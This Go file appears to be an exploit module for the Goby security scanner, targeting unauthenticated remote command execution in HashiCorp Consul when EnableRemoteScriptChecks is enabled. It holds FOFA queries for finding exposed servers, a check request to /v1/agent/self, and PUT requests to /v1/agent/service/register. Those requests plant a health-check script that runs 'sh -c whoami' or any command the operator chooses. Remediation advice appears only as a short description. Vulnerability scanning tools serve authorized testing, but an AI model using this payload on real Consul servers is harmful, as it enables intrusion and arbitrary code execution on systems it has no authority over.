package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Hashicorp Consul Service API RCE",
    "Description": "<p>Consul is an open source tool launched by HashiCorp, which is used to realize service discovery and configuration of distributed systems.</p><p>There is a security vulnerability in Hashicorp Consul. When EnableRemoteScriptChecks is configured as True, unauthorized users can remotely execute commands on the Consul server.</p>",
    "Product": "Hashicorp Consul",
    "Homepage": "https://www.consul.io/",
    "DisclosureDate": "2022-03-23",
    "Author": "abszse",
    "FofaQuery": "title=\"Consul\"",
    "GobyQuery": "title=\"Consul\"",
    "Level": "3",
    "Impact": "<p>There is a security vulnerability in Hashicorp Consul. When EnableRemoteScriptChecks is configured as True, unauthorized users can remotely execute commands on the Consul server.</p>",
    "Recommendation": "<p>Disable script checking on Consul server (EnableRemoteScriptChecks is set to false)</p><p>Set a whitelist to ensure that the ConsulHTTP API cannot be accessed from the Internet</p><p>Update to the latest version: <a href=\"https://www.consul.io/\">https://www.consul.io/</a></p>",
    "References": [
        "https://blog.csdn.net/qq_44159028/article/details/115870000"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "nslookup yourdnslog",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/v1/agent/self",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "EnableRemoteScriptChecks\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "PUT",
                "uri": "/v1/agent/service/register",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "{\n    \"ID\": \"bpPeMfZuAN\",\n    \"Name\": \"bpPeMfZuAN\",\n    \"Address\":\"127.0.0.1\",\n    \"Port\":80,\n    \"check\":{\n                \"script\":\"whoami\",\n                \"Args\": [\"sh\", \"-c\",\"whoami\"],\n                \"interval\":\"10s\",\n                \"Timeout\":\"86400s\"\n    }\n}\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/v1/agent/service/register",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "{\n    \"ID\": \"bpPeMfZuAN\",\n    \"Name\": \"bpPeMfZuAN\",\n    \"Address\":\"127.0.0.1\",\n    \"Port\":80,\n    \"check\":{\n                \"script\":\"{{{cmd}}}\",\n                \"Args\": [\"sh\", \"-c\",\"{{{cmd}}}\"],\n                \"interval\":\"10s\",\n                \"Timeout\":\"86400s\"\n    }\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Hashicorp Consul Service API 远程命令执行漏洞",
            "Product": "Hashicorp Consul",
            "Description": "<p>Consul是HashiCorp公司推出的一款开源工具，用于实现分布式系统的服务发现与配置。<br></p><p>Hashicorp Consul存在安全漏洞，在配置EnableRemoteScriptChecks为True的情况下，未授权用户可在Consul服务端远程执行命令。<br></p>",
            "Recommendation": "<p>禁用Consul服务器上的脚本检查（EnableRemoteScriptChecks设置为false）</p><p>设置白名单，确保ConsulHTTP API 不可外网访问</p><p>更新至最新版本：<a href=\"https://www.consul.io/\">https://www.consul.io/</a></p>",
            "Impact": "<p>Hashicorp Consul存在安全漏洞，在配置EnableRemoteScriptChecks为True的情况下，未授权用户可在Consul服务端远程执行命令。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Hashicorp Consul Service API RCE",
            "Product": "Hashicorp Consul",
            "Description": "<p>Consul is an open source tool launched by HashiCorp, which is used to realize service discovery and configuration of distributed systems.<br></p><p>There is a security vulnerability in Hashicorp Consul. When EnableRemoteScriptChecks is configured as True, unauthorized users can remotely execute commands on the Consul server.<br></p>",
            "Recommendation": "<p>Disable script checking on Consul server (EnableRemoteScriptChecks is set to false)</p><p>Set a whitelist to ensure that the ConsulHTTP API cannot be accessed from the Internet</p><p>Update to the latest version: <a href=\"https://www.consul.io/\">https://www.consul.io/</a></p>",
            "Impact": "<p>There is a security vulnerability in Hashicorp Consul. When EnableRemoteScriptChecks is configured as True, unauthorized users can remotely execute commands on the Consul server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}